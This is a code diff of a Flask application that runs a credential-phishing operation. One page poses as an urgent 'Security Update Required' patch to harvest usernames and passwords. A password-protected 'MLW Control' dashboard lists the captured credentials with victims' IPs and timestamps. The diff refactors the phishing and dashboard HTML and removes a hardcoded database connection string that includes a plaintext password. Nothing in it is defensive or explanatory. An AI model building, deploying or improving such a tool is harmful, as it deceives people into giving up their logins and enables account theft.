@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify, render_template_string, send_from_directory
+from flask import Flask, request, jsonify, render_template_string
 from flask_cors import CORS
 import psycopg2
 import os
@@ -7,7 +7,7 @@ from datetime import datetime
 app = Flask(__name__)
 CORS(app)
 
-DATABASE_URL = os.environ.get('DATABASE_URL', 'postgresql://mlw_attack_user:ShJf3c9NA4Jf1ADITLYh3fIlHc7akHXC@dpg-d8063p9j2pic73f1mm40-a.frankfurt-postgres.render.com:5432/mlw_attack')
+DATABASE_URL = os.environ.get('DATABASE_URL')
 
 def get_db():
     return psycopg2.connect(DATABASE_URL, sslmode='require')
@@ -31,7 +31,7 @@ def init_db():
 
 init_db()
 
-HTML = '''
+DASHBOARD_HTML = '''
 <!DOCTYPE html>
 <html>
 <head>
@@ -68,26 +68,33 @@ HTML = '''
         async function loadData() {
             const res = await fetch('/api/data');
             const data = await res.json();
-            document.getElementById('data').innerHTML = data.map(r => `<tr><td>${r.timestamp}</td><td>${r.ip}</td><td>${r.credentials}</td></tr>`).join('');
+            let html = '';
+            for (let r of data) {
+                html += '<tr><td>' + r.timestamp + '</td><td>' + r.ip + '</td><td>' + r.credentials + '</td></tr>';
+            }
+            document.getElementById('data').innerHTML = html;
         }
         checkAuth();
     </script>
 </head>
 <body>
-<div id="login" class="login" style="display:none">
+<div id="login" class="login">
     <h2>MLW Control</h2>
     <input type="password" id="pwd" placeholder="Password">
     <button onclick="login()">Login</button>
 </div>
-<div id="content">
+<div id="content" style="display:none">
     <h1>MLW Control - Captured Data</h1>
-    <table><tr><th>Time</th><th>IP</th><th>Credentials</th></tr><tbody id="data"></tbody></table>
+    <table>
+        <tr><th>Time</th><th>IP</th><th>Credentials</th></tr>
+        <tbody id="data"></tbody>
+    </table>
 </div>
 </body>
 </html>
 '''
 
-PHISHING_PAGE = '''
+PHISHING_HTML = '''
 <!DOCTYPE html>
 <html>
 <head>
@@ -103,7 +110,7 @@ PHISHING_PAGE = '''
 </head>
 <body>
 <div class="box">
-    <h2>🔒 Security Update Required</h2>
+    <h2>Security Update Required</h2>
     <p>Your device needs an urgent security patch.</p>
     <form id="captureForm">
         <input type="text" name="username" placeholder="Username" required>
@@ -124,7 +131,7 @@ PHISHING_PAGE = '''
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({data: JSON.stringify(data)})
         });
-        document.getElementById('result').innerHTML = '<p style="color:#0f0;">✅ Update complete. Your device is secure.</p>';
+        document.getElementById('result').innerHTML = '<p style="color:#0f0;">Update complete. Your device is secure.</p>';
         this.reset();
     });
 </script>
@@ -134,11 +141,11 @@ PHISHING_PAGE = '''
 
 @app.route('/')
 def index():
-    return render_template_string(HTML)
+    return render_template_string(DASHBOARD_HTML)
 
 @app.route('/update')
 def update():
-    return render_template_string(PHISHING_PAGE)
+    return render_template_string(PHISHING_HTML)
 
 @app.route('/api/auth')
 def auth():
